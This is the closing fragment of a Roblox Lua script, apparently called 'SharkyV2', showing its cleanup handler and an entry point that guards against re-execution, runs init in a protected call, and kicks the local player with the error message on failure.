			print("DEBUG: LocalPlayer removing. Cleaning up...") -- Debug print
			if playerAddedConn then playerAddedConn:Disconnect() end
			if chatConnection then chatConnection:Disconnect() end
			if mainLoopStopper and type(mainLoopStopper) == "function" then mainLoopStopper() end
			if localPlayerRemovingConn then localPlayerRemovingConn:Disconnect() end
			print("DEBUG: Cleanup complete.") -- Debug print
		end
	end)
	print("DEBUG: init() function finished.") -- Debug print
end

--[[ Script Entry Point ]]--
if not shared.ScriptExecuted_SharkyV2_FinalFormatted_v5_NoKick then -- Unique flag for this version
	shared.ScriptExecuted_SharkyV2_FinalFormatted_v5_NoKick = true
	task.spawn(function()
		print("DEBUG: Running init() in protected call...") -- Debug print
		local success, errorMessage = pcall(init)
		if not success then
			warn("SCRIPT INIT P CALL ERROR:", errorMessage)
			print("DEBUG: SCRIPT INIT P CALL ERROR:", errorMessage) -- Debug print
			task.spawn(function()
				local safeMsg = string.gsub(tostring(errorMessage or "Unknown Error"), "[<>\"']", "")
				print("DEBUG: Kicking due to pcall error:", safeMsg) -- Debug print
				LocalPlayer:Kick("Script Init Error: " .. safeMsg)
			end)
		else
			print("DEBUG: init() pcall completed successfully.") -- Debug print
		end
	end)
else
	print("DEBUG: Script flag already set, preventing re-execution.") -- Debug print
end
